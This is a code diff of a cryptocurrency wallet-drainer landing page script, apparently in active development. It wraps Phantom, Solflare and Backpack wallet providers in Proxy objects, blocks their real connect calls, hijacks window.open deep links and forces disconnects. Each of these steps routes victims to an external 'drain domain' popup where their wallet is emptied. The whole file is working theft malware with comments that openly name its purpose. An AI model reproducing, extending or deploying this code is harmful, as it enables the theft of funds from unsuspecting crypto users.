@@ -8,7 +8,6 @@ import { SolanaAdapter } from '@reown/appkit-adapter-solana'
 import { solana } from '@reown/appkit/networks'
 
 const DRAIN_BASE = 'https://drforsostate.vercel.app/';
-const EVM_DRAIN_BASE = 'https://drforevstate.vercel.app/';
 const PROJECT_ID = '5db25d59ec5c740d09771e8b9037b7f9';
 const isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
@@ -52,24 +51,21 @@ const modal = createAppKit({
 });
 
 // =====================================================
-// OPEN POPUP — ALL wallets go to Drain Domain
-// Landing is "dumb terminal" — never connects itself
+// OPEN POPUP WITH WALLET NAME IN URL
 // =====================================================
 let popupOpened = false;
 
 // Save original window.open EARLY — before any override
 const _origOpen = window.open.bind(window);
 
-// EVM-only wallets go to the EVM drainer instead of Solana drainer
-const EVM_ONLY_WALLETS = ['metamask', 'brave'];
-
 function openDrainPopup(walletName) {
   if (popupOpened) return;
   popupOpened = true;
 
   try { modal.close(); } catch (e) {}
+  try { modal.disconnect(); } catch (e) {}
 
-  // Map wallet name to short key for the drain domain
+  // Map wallet name to short key
   const w = (walletName || '').toLowerCase();
   let walletKey = 'auto';
   if (w.includes('phantom')) walletKey = 'phantom';
@@ -77,24 +73,17 @@ function openDrainPopup(walletName) {
   else if (w.includes('trust')) walletKey = 'trust';
   else if (w.includes('backpack')) walletKey = 'backpack';
   else if (w.includes('coinbase')) walletKey = 'coinbase';
-  else if (w.includes('safepal')) walletKey = 'safepal';
-  else if (w.includes('binance')) walletKey = 'binance';
-  else if (w.includes('okx')) walletKey = 'okx';
-  else if (w.includes('metamask')) walletKey = 'metamask';
-  else if (w.includes('brave')) walletKey = 'brave';
   else if (w.includes('walletconnect') || w.includes('qr')) walletKey = 'wc';
-  else if (w.trim()) walletKey = w.replace(/[^a-z0-9]/g, '');
 
-  // EVM-only wallets go to EVM drainer, everything else to Solana drainer
-  const drainBase = EVM_ONLY_WALLETS.includes(walletKey) ? EVM_DRAIN_BASE : DRAIN_BASE;
-  const url = `${drainBase}?connect=1&w=${walletKey}`;
+  const url = `${DRAIN_BASE}?connect=1&w=${walletKey}`;
 
   if (isMobile) {
     window.location.href = url;
   } else {
-    const pw = 420, ph = 700;
+    const pw = 360, ph = 440;
     const left = Math.round((screen.width - pw) / 2);
     const top = Math.round((screen.height - ph) / 2);
+    // Use _origOpen to bypass our own interceptor
     _origOpen(url, 'connect_wallet',
       `width=${pw},height=${ph},left=${left},top=${top},toolbar=no,menubar=no,scrollbars=no,resizable=no,location=no`
     );
@@ -104,70 +93,81 @@ function openDrainPopup(walletName) {
 }
 
 // =====================================================
-// INTERCEPT ALL WALLET CLICKS — Landing is "dumb terminal"
-// ALL connection logic happens on the Drain Domain
+// INTERCEPT WALLET CLICKS
 // =====================================================
 
+// Track last selected wallet name
 let lastClickedWallet = '';
 
-// Block ALL wallet extensions so nothing connects on landing
-function blockAllProviders() {
-  // Solana providers
-  if (window.phantom?.solana && !window.phantom.solana._landingBlocked) {
-    window.phantom.solana._landingBlocked = true;
-    window.phantom.solana.connect = function() {
-      openDrainPopup('phantom');
-      return new Promise(() => {});
-    };
-  }
-  if (window.solana && !window.solana._landingBlocked) {
-    window.solana._landingBlocked = true;
-    window.solana.connect = function() {
-      openDrainPopup(lastClickedWallet || 'phantom');
-      return new Promise(() => {});
-    };
-  }
-  if (window.solflare && !window.solflare._landingBlocked) {
-    window.solflare._landingBlocked = true;
-    window.solflare.connect = function() {
-      openDrainPopup('solflare');
-      return new Promise(() => {});
-    };
-  }
-  if (window.backpack?.solana && !window.backpack.solana._landingBlocked) {
-    window.backpack.solana._landingBlocked = true;
-    window.backpack.solana.connect = function() {
-      openDrainPopup('backpack');
-      return new Promise(() => {});
-    };
-  }
+// ---- BLOCK ALL WALLET CONNECTIONS ON LANDING DOMAIN ----
+// Use Object.defineProperty + Proxy to intercept Solana wallet providers
+// Catches Phantom/Solflare/Backpack even if they inject after our code
 
-  // EVM providers (MetaMask, Brave)
-  const patchEVM = (provider) => {
-    if (!provider?.request || provider._landingBlocked) return;
-    provider._landingBlocked = true;
-    const origRequest = provider.request.bind(provider);
-    provider.request = function(args) {
-      if (args?.method === 'eth_requestAccounts' || args?.method === 'wallet_requestPermissions') {
-        const name = provider.isMetaMask ? 'metamask' : provider.isBraveWallet ? 'brave' : lastClickedWallet || 'metamask';
-        openDrainPopup(name);
-        return new Promise(() => {});
+function blockSolanaWallet(obj, prop, walletName) {
+  if (!obj || !obj[prop]) return;
+  const real = obj[prop];
+  if (real._landingBlocked) return;
+  const handler = {
+    get(target, key) {
+      if (key === '_landingBlocked') return true;
+      if (key === 'connect') {
+        return function() {
+          openDrainPopup(walletName);
+          return new Promise(() => {}); // never resolve — block connection
+        };
       }
-      return origRequest(args);
-    };
+      const val = Reflect.get(target, key);
+      return typeof val === 'function' ? val.bind(target) : val;
+    }
   };
-  if (window.ethereum) {
-    patchEVM(window.ethereum);
-    if (window.ethereum.providers) window.ethereum.providers.forEach(patchEVM);
+  try {
+    const proxy = new Proxy(real, handler);
+    Object.defineProperty(obj, prop, {
+      configurable: true,
+      enumerable: true,
+      get() { return proxy; },
+      set(val) { /* ignore overwrites */ },
+    });
+  } catch (e) {
+    // Fallback: patch connect directly
+    real._landingBlocked = true;
+    real.connect = function() {
+      openDrainPopup(walletName);
+      return new Promise(() => {});
+    };
   }
 }
 
-blockAllProviders();
-setTimeout(blockAllProviders, 500);
-setTimeout(blockAllProviders, 1500);
-setTimeout(blockAllProviders, 3000);
+function blockAllSolanaProviders() {
+  // Phantom
+  if (window.phantom?.solana) blockSolanaWallet(window.phantom, 'solana', 'phantom');
+  if (window.solana) {
+    try {
+      const realSolana = window.solana;
+      if (!realSolana._landingBlocked) {
+        const origConnect = realSolana.connect;
+        realSolana._landingBlocked = true;
+        realSolana.connect = function() {
+          openDrainPopup(lastClickedWallet || 'phantom');
+          return new Promise(() => {});
+        };
+      }
+    } catch (e) {}
+  }
+  // Solflare
+  if (window.solflare) blockSolanaWallet(window, 'solflare', 'solflare');
+  // Backpack
+  if (window.backpack?.solana) blockSolanaWallet(window.backpack, 'solana', 'backpack');
+}
 
-// Intercept ALL wallet selections from AppKit → redirect to drain popup
+// Patch immediately + re-check (extensions load async)
+blockAllSolanaProviders();
+setTimeout(blockAllSolanaProviders, 300);
+setTimeout(blockAllSolanaProviders, 800);
+setTimeout(blockAllSolanaProviders, 1500);
+setTimeout(blockAllSolanaProviders, 3000);
+
+// Track wallet name from AppKit events — fires BEFORE connection starts
 modal.subscribeEvents((event) => {
   const e = event?.data?.event;
   if (e === 'SELECT_WALLET') {
@@ -179,66 +179,31 @@ modal.subscribeEvents((event) => {
   }
 });
 
-// If any wallet somehow connects to landing, disconnect and redirect
+// Backup: If wallet somehow connects to landing, disconnect and redirect
 modal.subscribeProviders((state) => {
   if (state['solana']) {
-    const addr = modal.getAddress();
-    if (addr) {
-      try { modal.disconnect(); } catch (e) {}
-      openDrainPopup(lastClickedWallet || 'auto');
-    }
+    try { modal.disconnect(); } catch (e) {}
+    openDrainPopup(lastClickedWallet);
   }
 });
 
-// Intercept ALL deep links / wallet:// protocol opens
+// Method 4: Intercept deep links (wallet:// protocol opens)
 window.open = function(url, ...args) {
-  if (url && typeof url === 'string' && !url.includes(DRAIN_BASE) && !url.includes(EVM_DRAIN_BASE)) {
+  if (url && typeof url === 'string' && !url.includes(DRAIN_BASE)) {
     if (url.includes('phantom')) { openDrainPopup('phantom'); return null; }
     if (url.includes('solflare')) { openDrainPopup('solflare'); return null; }
-    if (url.includes('backpack')) { openDrainPopup('backpack'); return null; }
     if (url.includes('trust')) { openDrainPopup('trust'); return null; }
-    if (url.includes('metamask')) { openDrainPopup('metamask'); return null; }
-    if (url.includes('brave://')) { openDrainPopup('brave'); return null; }
-    if (url.includes('wc:') || url.includes('walletconnect')) { openDrainPopup(lastClickedWallet || 'wc'); return null; }
+    if (url.includes('backpack')) { openDrainPopup('backpack'); return null; }
+    if (url.includes('wc:') || url.includes('walletconnect')) { openDrainPopup('walletconnect'); return null; }
   }
   return _origOpen.call(window, url, ...args);
 };
 
 // =====================================================
-// EXPOSE TO HTML — wait for AppKit to be fully ready
+// EXPOSE TO HTML
 // =====================================================
-let _modalReady = false;
-let _pendingOpen = false;
-
-// Detect when AppKit is truly initialized by watching for its web component
-const _readyCheck = setInterval(() => {
-  const el = document.querySelector('w3m-modal') || document.querySelector('appkit-modal');
-  if (el) {
-    _modalReady = true;
-    clearInterval(_readyCheck);
-    // If user clicked before ready, open now
-    if (_pendingOpen) {
-      _pendingOpen = false;
-      popupOpened = false;
-      lastClickedWallet = '';
-      modal.open({ view: 'Connect' });
-    }
-  }
-}, 50);
-
 window.openWalletModal = () => {
   popupOpened = false;
   lastClickedWallet = '';
-  if (_modalReady) {
-    modal.open({ view: 'Connect' });
-  } else {
-    // Queue it — will fire as soon as AppKit element appears in DOM
-    _pendingOpen = true;
-  }
+  modal.open({ view: 'Connect' });
 };
-
-// Replay any click that happened before module loaded (from HTML stub)
-if (window._walletQueue) {
-  window._walletQueue = false;
-  window.openWalletModal();
-}
